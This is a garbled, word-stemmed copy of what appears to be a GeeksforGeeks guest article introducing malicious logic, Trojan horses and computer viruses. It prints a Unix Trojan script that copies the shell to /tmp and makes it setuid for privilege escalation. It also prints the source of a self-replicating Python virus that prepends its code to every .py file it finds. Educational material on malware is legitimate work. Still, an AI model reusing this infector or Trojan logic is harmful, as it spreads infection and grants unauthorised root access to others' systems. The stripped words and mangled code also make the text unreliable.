@@ -1,0 +1,33 @@
+note use onlin compil go work 
+pleas instal python 2 7x cv2 argpars modul actual tri exampl 
+heya friend 
+welcom back 
+continu malici logic request look great inform articl worm virus beyond 
+articl focu applic theori comput virus worm trojan hors 
+pleas note articl meant use educ purpos way promot usag virus worm trojan hors attack comput system caus damag 
+malici logic set instruct basic program caus violat secur polici websit program applic etc 
+unix script cp bin sh tmp xxsh chmod u x tmp xxsh rm ls ls exampl assum path environ script name ls place directori 
+analys script script creat copi unix shell setuid user execut program 
+understand setuid program first need understand user ident store unix os 
+unix os user ident usual repres integ 0 gener 65 535 number also refer uid uniqu identif number 
+setuid program creat process uid owner third person execut program 
+mean executor right owner possibl vulner 
+come back script setuid copi unix shell creat 
+later program delet correct ls command list file folder present current work directori execut 
+trojan hors go back previou script suppos someon root type cp bin sh tmp xxsh chmod w x tmp xxsh script type deliber result trojan hors 
+viru basic format comput virus follow follow basic script beginviru spread condit true begin target file begin target affect true begin determin place viru instruct copi viru instruct modifi target spread viru later end end end perform instruct option go back begin endviru basic everi comput viru two phase insert phase phase viru insert target 
+execut phase phase viru perform action 
+let take look real viru python 
+actual viru caus corrupt file delet system file etc 
+simpl harmless viru 
+usr bin python import os datetim inspect data_to_insert geeksforgeek def search path search target file path filestoinfect filelist os listdir path filenam filelist os path isdir path filenam folder filestoinfect extend search path filenam elif filenam 3 py python script infect infect fals default valu line open path filenam data_to_insert line infect true break infect fals filestoinfect append path filenam return filestoinfect def infect filestoinfect chang made target file target_fil inspect currentfram f_code co_filenam viru open os path abspath target_fil virusstr line enumer viru 0 41 virusstr line viru close fname filestoinfect f open fname temp f read f close f open fname w f write virusstr temp f close def explod requir actual datetim datetim month 4 datetim datetim day 1 print happi april fool day 
+filestoinfect search os path abspath infect filestoinfect explod quit safe viru basic format work 
+also variou type comput viru boot sector infector execut infector multipartit viru tsr viru stealth viru encrypt viru polymorph viru macro viru 
+go detail stop 
+side 
+author vishwesh shrimali undergradu mechan engin student bit pilani 
+fulfil requir taught branch white hat hacker network secur oper ex competit programm 
+firm believ power python major work languag 
+whenev get time apart program attend class watch csi cyber go long walk play guitar silenc 
+motto life enjoy life caus worth enjoy also wish showcas blog pleas see gblog guest blog write geeksforgeek 
+adsbygoogl window adsbygoogl push compani wise code practic topic wise code practic 
